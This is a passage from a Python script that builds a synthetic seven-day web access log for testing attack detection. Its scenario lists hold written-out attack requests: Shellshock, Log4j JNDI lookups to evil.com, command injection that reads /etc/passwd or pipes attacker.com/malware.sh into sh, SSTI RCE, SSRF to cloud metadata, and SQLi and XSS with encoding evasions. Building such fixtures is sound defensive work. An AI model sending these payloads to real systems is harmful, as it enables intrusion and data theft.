    {"method": "GET", "url": "/cgi-bin/stats.cgi", "status": 500, "bytes": 480, "ip": ATTACKER_IPS["rce_gang"], "referer": "() { :; }; /usr/bin/id", "desc": "Shellshock in Referer header"},

    # Spring4Shell (CVE-2022-22965)
    {"method": "POST", "url": "/helloworld?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di", "status": 400, "bytes": 280, "ip": ATTACKER_IPS["modern_vector"], "desc": "Spring4Shell ClassLoader exploit query"},
    {"method": "POST", "url": "/api/user?class.classLoader.resources.context.parent.appBase=shell", "status": 400, "bytes": 260, "ip": ATTACKER_IPS["modern_vector"], "desc": "Spring4Shell appBase manipulation"},

    # SSTI (Server-Side Template Injection)
    {"method": "GET", "url": "/store/catalog?search={{7*7}}", "status": 200, "bytes": 4510, "ip": ATTACKER_IPS["modern_vector"], "desc": "SSTI Jinja2 math {{7*7}}"},
    {"method": "GET", "url": "/portal/welcome?name=${7*7}", "status": 200, "bytes": 3200, "ip": ATTACKER_IPS["modern_vector"], "desc": "SSTI Spring EL math ${7*7}"},
    {"method": "GET", "url": "/portal/render?template={{config.__class__.__init__.__globals__[%27os%27].popen(%27id%27).read()}}", "status": 500, "bytes": 840, "ip": ATTACKER_IPS["modern_vector"], "desc": "SSTI Jinja2 RCE gadget"},
    {"method": "GET", "url": "/blog/preview?title={{self._TemplateReference__context.namespace}}", "status": 200, "bytes": 1240, "ip": ATTACKER_IPS["modern_vector"], "desc": "SSTI context probe"},

    # OS Command Injection
    {"method": "GET", "url": "/admin/diagnostics.php?host=127.0.0.1;cat%20/etc/passwd", "status": 500, "bytes": 1024, "ip": ATTACKER_IPS["rce_gang"], "desc": "RCE command chaining cat /etc/passwd"},
    {"method": "GET", "url": "/cgi-bin/status.cgi?check=localhost|whoami", "status": 200, "bytes": 412, "ip": ATTACKER_IPS["rce_gang"], "desc": "RCE pipe injection whoami"},
    {"method": "GET", "url": "/tools/network.php?target=8.8.8.8%60id%60", "status": 200, "bytes": 380, "ip": ATTACKER_IPS["rce_gang"], "desc": "RCE backtick subshell id"},
    {"method": "GET", "url": "/cgi-bin/stats.sh?action=$(whoami)", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["rce_gang"], "desc": "RCE dollar subshell $(whoami)"},
    {"method": "GET", "url": "/ping.php?ip=127.0.0.1%20%26%26%20uname%20-a", "status": 200, "bytes": 510, "ip": ATTACKER_IPS["rce_gang"], "desc": "RCE double ampersand uname"},
    {"method": "GET", "url": "/admin/backup.sh?opt=$(curl%20http://attacker.com/malware.sh|sh)", "status": 500, "bytes": 620, "ip": ATTACKER_IPS["rce_gang"], "desc": "RCE curl piped to sh"},
]

# Day 6: Anti-Detection & Evasion Decoded by PayloadNormalizer
DAY6_EVASION_SCENARIOS = [
    # Unicode NFKC fullwidth normalization
    {"method": "GET", "url": "/store/search?q=%EF%BC%9Cscript%EF%BC%9Ealert(%27NFKC%27)%EF%BC%9C/script%EF%BC%9E", "status": 200, "bytes": 5400, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "Evasion: NFKC fullwidth script tags"},
    {"method": "GET", "url": "/files?name=..%EF%BC%8F..%EF%BC%8F..%EF%BC%8Fetc%EF%BC%8Fpasswd", "status": 403, "bytes": 280, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Evasion: NFKC fullwidth slashes traversal"},
    {"method": "GET", "url": "/admin?view=%EF%BC%9Cimg%20src=x%20onerror=alert(1)%EF%BC%9E", "status": 200, "bytes": 4120, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "Evasion: NFKC fullwidth img tag"},

    # Double URL encoding
    {"method": "GET", "url": "/docs/view?file=%252e%252e%252f%252e%252e%252fetc%252fshadow", "status": 403, "bytes": 280, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Evasion: Double URL-encoded traversal %252e%252e%252f"},
    {"method": "GET", "url": "/search?q=%253Cscript%253Ealert(document.cookie)%253C%252Fscript%253E", "status": 200, "bytes": 4810, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "Evasion: Double URL-encoded script tag"},
    {"method": "GET", "url": "/query?sql=1%2520UNION%2520SELECT%25201,2,3", "status": 500, "bytes": 620, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "Evasion: Double URL-encoded UNION SELECT"},

    # Embedded Base64 Payloads
    {"method": "GET", "url": "/execute?data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "status": 400, "bytes": 310, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "Evasion: Base64 embedded script payload"},
    {"method": "GET", "url": "/admin/runner?cmd=Y2F0IC9ldGMvcGFzc3dk", "status": 403, "bytes": 260, "ip": ATTACKER_IPS["rce_gang"], "desc": "Evasion: Base64 cat /etc/passwd in cmd="},
    {"method": "GET", "url": "/api/v2/handler?payload=PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+", "status": 400, "bytes": 240, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "Evasion: Base64 SVG payload in payload="},
    {"method": "GET", "url": "/view?code=dW5hbWUgLWE7IGlk", "status": 400, "bytes": 210, "ip": ATTACKER_IPS["rce_gang"], "desc": "Evasion: Base64 uname in code="},

    # Null-byte Injection
    {"method": "GET", "url": "/download?doc=annual_report.pdf%00.exe", "status": 400, "bytes": 180, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Evasion: Null-byte extension bypass .pdf%00.exe"},
    {"method": "GET", "url": "/view.php?file=secret.txt%00.jpg", "status": 400, "bytes": 190, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Evasion: Null-byte file view %00.jpg"},
    {"method": "GET", "url": "/upload/avatar?file=shell.php%00.png", "status": 403, "bytes": 220, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Evasion: Null-byte avatar upload"},

    # CRLF / HTTP Response Splitting
    {"method": "GET", "url": "/redirect?url=https://example.com%0d%0aSet-Cookie:%20account_session=hijacked_session_token", "status": 302, "bytes": 240, "ip": ATTACKER_IPS["modern_vector"], "desc": "CRLF Set-Cookie response splitting"},
    {"method": "GET", "url": "/auth/callback?next=%0d%0aLocation:%20https://evil-phishing-attacker.com", "status": 302, "bytes": 210, "ip": ATTACKER_IPS["modern_vector"], "desc": "CRLF Location header split"},
    {"method": "GET", "url": "/forward?dest=index.html%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E", "status": 302, "bytes": 320, "ip": ATTACKER_IPS["modern_vector"], "desc": "CRLF XSS body injection"},

    # Alternative SSRF IP Encodings
    {"method": "GET", "url": "/fetch?endpoint=http://2852039166/latest/meta-data/", "status": 403, "bytes": 290, "ip": ATTACKER_IPS["ssrf_actor"], "desc": "SSRF AWS metadata decimal IP (2852039166)"},
    {"method": "GET", "url": "/download/file?source=http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/", "status": 403, "bytes": 290, "ip": ATTACKER_IPS["ssrf_actor"], "desc": "SSRF AWS metadata hex dotted (0xa9.0xfe...)"},
    {"method": "GET", "url": "/proxy?url=http://0251.0376.0249.0376/latest/meta-data/", "status": 403, "bytes": 290, "ip": ATTACKER_IPS["ssrf_actor"], "desc": "SSRF AWS metadata octal dotted"},
    {"method": "GET", "url": "/api/v1/preview?image=http://0x7f000001/admin/dashboard", "status": 403, "bytes": 190, "ip": ATTACKER_IPS["ssrf_actor"], "desc": "SSRF localhost 0x7f000001 hex"},
    {"method": "GET", "url": "/proxy?url=http://2130706433/", "status": 403, "bytes": 180, "ip": ATTACKER_IPS["ssrf_actor"], "desc": "SSRF localhost 2130706433 decimal"},

    # Prototype Pollution
    {"method": "GET", "url": "/api/v2/profile/update?__proto__[isAdmin]=true", "status": 400, "bytes": 210, "ip": ATTACKER_IPS["modern_vector"], "desc": "Prototype pollution __proto__[isAdmin]"},
    {"method": "GET", "url": "/settings/theme?constructor[prototype][polluted]=yes", "status": 200, "bytes": 450, "ip": ATTACKER_IPS["modern_vector"], "desc": "Prototype pollution constructor.prototype"},
    {"method": "GET", "url": "/api/v2/session?prototype.isAdmin=1", "status": 403, "bytes": 180, "ip": ATTACKER_IPS["modern_vector"], "desc": "Prototype pollution prototype.isAdmin"},
]

# Day 7: Coordinated Multi-Vector Campaign & Critical Anathema Triggers
DAY7_ANATHEMA_CRITICAL_SCENARIOS = [
    # Critical Anathema triggers (severity >= 10 -> BAN)
    {"method": "GET", "url": "/w00tw00t.cgi", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["nikto"], "desc": "Anathema: w00tw00t.cgi trigger (s=10)"},
    {"method": "GET", "url": "/tmUnblock.cgi", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["sqlmap_bot"], "agent": ATTACK_USER_AGENTS["nikto"], "desc": "Anathema: tmUnblock.cgi trigger (s=10)"},
    {"method": "GET", "url": "/myadmin/scripts/setup.php", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["rce_gang"], "desc": "Anathema: myadmin setup.php trigger (s=10)"},
    {"method": "GET", "url": "/pma/scripts/setup.php", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Anathema: pma setup.php trigger (s=10)"},
    {"method": "GET", "url": "/phpmyadmin/scripts/setup.php", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "Anathema: phpmyadmin setup.php trigger (s=10)"},
    {"method": "GET", "url": "/cgi-sys/defaultwebpage.cgi", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["rce_gang"], "desc": "Anathema: cgi-sys defaultwebpage trigger (s=10)"},
    {"method": "GET", "url": "/bigdump/bigdump.php", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["log4j_crawler"], "desc": "Anathema: bigdump.php trigger (s=10)"},
    {"method": "GET", "url": "/wp-config.php", "status": 403, "bytes": 280, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Anathema: wp-config.php sensitive probe (s=9)"},
    {"method": "GET", "url": "/HNAP1/", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Anathema: HNAP1 IoT router probe (s=8)"},
]

# Follow-up high-volume hammering from banned IPs on Day 7
DAY7_MULTI_VECTOR_SCENARIOS = [
    # APT Scanner multi-vector
    {"method": "GET", "url": "/admin/config.php", "status": 403, "bytes": 280, "ip": ATTACKER_IPS["apt_scanner"], "desc": "APT scanner post-ban probing admin"},
    {"method": "GET", "url": "/.env", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "APT scanner post-ban .env"},
    {"method": "GET", "url": "/actuator/env", "status": 403, "bytes": 180, "ip": ATTACKER_IPS["apt_scanner"], "desc": "APT scanner post-ban Actuator"},
    {"method": "GET", "url": "/download.php?file=../../../../../../etc/passwd", "status": 403, "bytes": 310, "ip": ATTACKER_IPS["apt_scanner"], "desc": "APT scanner post-ban LFI"},

    # SQLMap Bot massive burst
    {"method": "GET", "url": "/store/product/view?id=42%20UNION%20SELECT%201,username,password,4%20FROM%20users--", "status": 500, "bytes": 740, "ip": ATTACKER_IPS["sqlmap_bot"], "agent": ATTACK_USER_AGENTS["sqlmap"], "desc": "SQLMap burst UNION SELECT"},
    {"method": "GET", "url": "/store/catalog?search=shoes%27%20AND%20SLEEP(5)--", "status": 200, "bytes": 840, "ip": ATTACKER_IPS["sqlmap_bot"], "agent": ATTACK_USER_AGENTS["sqlmap"], "desc": "SQLMap burst SLEEP(5)"},
    {"method": "GET", "url": "/forum/viewtopic.php?t=10%27%20OR%201=1--", "status": 200, "bytes": 15400, "ip": ATTACKER_IPS["sqlmap_bot"], "agent": ATTACK_USER_AGENTS["sqlmap"], "desc": "SQLMap burst OR 1=1"},

    # RCE Gang intensive assault
    {"method": "GET", "url": "/admin/diagnostics.php?host=127.0.0.1;cat%20/etc/passwd", "status": 500, "bytes": 1024, "ip": ATTACKER_IPS["rce_gang"], "desc": "RCE gang cat passwd"},
    {"method": "GET", "url": "/cgi-bin/status.cgi?check=localhost|whoami", "status": 200, "bytes": 412, "ip": ATTACKER_IPS["rce_gang"], "desc": "RCE gang whoami"},
    {"method": "GET", "url": "/cgi-bin/test-cgi", "status": 500, "bytes": 740, "ip": ATTACKER_IPS["rce_gang"], "agent": ATTACK_USER_AGENTS["shellshock"], "desc": "RCE gang Shellshock UA"},

    # IPv6 Actor multi-vector
    {"method": "GET", "url": "/store/catalog?search=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "status": 200, "bytes": 9410, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "IPv6 actor XSS cookie"},
    {"method": "GET", "url": "/feedback?msg=%3Cimg%20src=x%20onerror=alert(1)%3E", "status": 200, "bytes": 4510, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "IPv6 actor XSS img"},
    {"method": "GET", "url": "/store/search?q=%EF%BC%9Cscript%EF%BC%9Ealert(%27NFKC%27)%EF%BC%9C/script%EF%BC%9E", "status": 200, "bytes": 5400, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "IPv6 actor NFKC script"},

    # Log4j Crawler header scan
    {"method": "GET", "url": "/search?q=${jndi:ldap://198.51.100.200:1389/Exploit}", "status": 400, "bytes": 350, "ip": ATTACKER_IPS["log4j_crawler"], "desc": "Log4j crawler URL JNDI"},
    {"method": "GET", "url": "/api/v2/auth/login", "status": 401, "bytes": 180, "ip": ATTACKER_IPS["log4j_crawler"], "agent": ATTACK_USER_AGENTS["log4j_agent"], "desc": "Log4j crawler UA JNDI"},
    {"method": "GET", "url": "/feedback", "status": 200, "bytes": 2400, "ip": ATTACKER_IPS["log4j_crawler"], "referer": "http://example.com/feedback?ref=${${lower:j}ndi:${lower:l}dap://evil.com/a}", "desc": "Log4j crawler Referer JNDI"},
]


def generate_enterprise_log(output_path: Path) -> dict:
    """Generates 105,000 log records across 7 days with progressive attack escalation."""
    t0 = time.perf_counter()
    output_path.parent.mkdir(parents=True, exist_ok=True)

    stats = {
        "total_lines": 0,
        "days": {},
    }

    # Configuration for each day: (day_index, attack_ratio, attack_pool, day_name)
    day_configs = [
        # Day 1: 14/Oct/2024 - 0.5% attacks (75 attack lines / 14,925 benign)
        (0, 0.005, DAY1_RECON_SCENARIOS, "Baseline Normal Business & Passive Recon"),
        # Day 2: 15/Oct/2024 - 3.0% attacks (450 attack lines / 14,550 benign)
        (1, 0.030, DAY2_SCAN_SCENARIOS, "Active Directory Scanning & Info Disclosure"),
        # Day 3: 16/Oct/2024 - 7.0% attacks (1,050 attack lines / 13,950 benign)
        (2, 0.070, DAY3_CLASSIC_SCENARIOS, "Classic Web Attacks: Traversal, LFI, XSS"),
        # Day 4: 17/Oct/2024 - 10.0% attacks (1,500 attack lines / 13,500 benign)
        (3, 0.100, DAY4_DB_SCENARIOS, "Database Exploitation: SQLi & NoSQLi"),
        # Day 5: 18/Oct/2024 - 12.0% attacks (1,800 attack lines / 13,200 benign)
        (4, 0.120, DAY5_HIGH_IMPACT_SCENARIOS, "High-Impact Exploitation: SSRF, Log4j, Shellshock, Spring, SSTI, RCE"),
        # Day 6: 19/Oct/2024 - 14.0% attacks (2,100 attack lines / 12,900 benign)
        (5, 0.140, DAY6_EVASION_SCENARIOS, "Evasion & Anti-Detection Decoded by PayloadNormalizer"),
        # Day 7: 20/Oct/2024 - 16.0% attacks (2,400 attack lines / 12,600 benign)
        (6, 0.160, DAY7_ANATHEMA_CRITICAL_SCENARIOS + DAY7_MULTI_VECTOR_SCENARIOS, "Coordinated Multi-Vector Campaign & Anathema Banning"),
    ]

    base_date = datetime.datetime(2024, 10, 14, 0, 0, 0, tzinfo=datetime.timezone.utc)

    # Use a large buffer for fast, atomic file write
    buffer_lines = []
    total_written = 0

    with open(output_path, "w", encoding="utf-8", buffering=1024 * 1024) as out_f:
        for day_offset, attack_ratio, attack_pool, day_title in day_configs:
            day_date = base_date + datetime.timedelta(days=day_offset)
            date_str = day_date.strftime("%d/%b/%Y")

            num_attacks = int(LINES_PER_DAY * attack_ratio)
            num_benign = LINES_PER_DAY - num_attacks

            # Select attack slot indices spread evenly throughout the day
            attack_indices = set(random.sample(range(LINES_PER_DAY), num_attacks))

            # For Day 7, guarantee that critical Anathema triggers occur early in the day
            # so the threat IPs get banned immediately and remain banned for subsequent requests
            if day_offset == 6:
                early_attack_indices = sorted(list(attack_indices))[:len(DAY7_ANATHEMA_CRITICAL_SCENARIOS)]
                critical_scenarios = list(DAY7_ANATHEMA_CRITICAL_SCENARIOS)
                random.shuffle(critical_scenarios)
                critical_map = {idx: critical_scenarios.pop() for idx in early_attack_indices}
            else:
                critical_map = {}

            day_attacks = 0
            day_benign = 0

            # Distribute timestamps across the full 24 hours (86,400 seconds)
            # Line i gets timestamp around i * (86390 / 15000) with small random jitter
            for line_idx in range(LINES_PER_DAY):
                sec_in_day = int((line_idx / LINES_PER_DAY) * 86380) + random.randint(0, 5)
                current_time = day_date + datetime.timedelta(seconds=sec_in_day)
                timestamp_str = current_time.strftime("%d/%b/%Y:%H:%M:%S +0000")

                if line_idx in attack_indices:
                    day_attacks += 1
                    if line_idx in critical_map:
                        scenario = critical_map[line_idx]
                    else:
                        scenario = random.choice(attack_pool)

                    method = scenario["method"]
                    url = scenario["url"]
                    proto = "HTTP/1.1"
                    status = scenario["status"]
                    bytes_sent = scenario["bytes"]
                    ip = scenario["ip"]
                    user = "-"
                    referer = scenario.get("referer", "https://example.com/portal/index")
                    user_agent = scenario.get("agent", random.choice(BENIGN_USER_AGENTS))
                else:
                    day_benign += 1
                    method, url, status, bytes_sent, referer, _ = random.choice(BENIGN_ENDPOINTS)
                    proto = random.choice(["HTTP/1.1", "HTTP/2.0", "HTTP/3.0"])
                    ip = random.choice(BENIGN_CLIENT_IPS)
                    user = "jdoe" if random.random() < 0.04 else "-"
                    user_agent = random.choice(BENIGN_USER_AGENTS)

                line = f'{ip} - {user} [{timestamp_str}] "{method} {url} {proto}" {status} {bytes_sent} "{referer}" "{user_agent}"'
                buffer_lines.append(line)

                if len(buffer_lines) >= 5000:
                    out_f.write("\n".join(buffer_lines) + "\n")
                    buffer_lines.clear()

            if buffer_lines:
                out_f.write("\n".join(buffer_lines) + "\n")
                buffer_lines.clear()

            total_written += LINES_PER_DAY
            stats["days"][date_str] = {
                "day_title": day_title,
                "total": LINES_PER_DAY,
                "benign": day_benign,
                "attacks": day_attacks,
                "attack_pct": round((day_attacks / LINES_PER_DAY) * 100, 2),
            }

    stats["total_lines"] = total_written
    stats["elapsed_seconds"] = time.perf_counter() - t0
    return stats


if __name__ == "__main__":
    target_log = Path(__file__).resolve().parent.parent / "examples" / "example.log"
    print(f"Generating 105,000 log records into: {target_log}")
    stats = generate_enterprise_log(target_log)
    print(f"Completed in {stats['elapsed_seconds']:.2f} seconds!")
    print(f"Total lines generated: {stats['total_lines']:,}")
    print("\nDaily breakdown:")
    for d, s in stats["days"].items():
        print(f"  {d}: {s['total']:,} lines ({s['attack_pct']}% attacks, {s['attacks']:,} attack records) - {s['day_title']}")
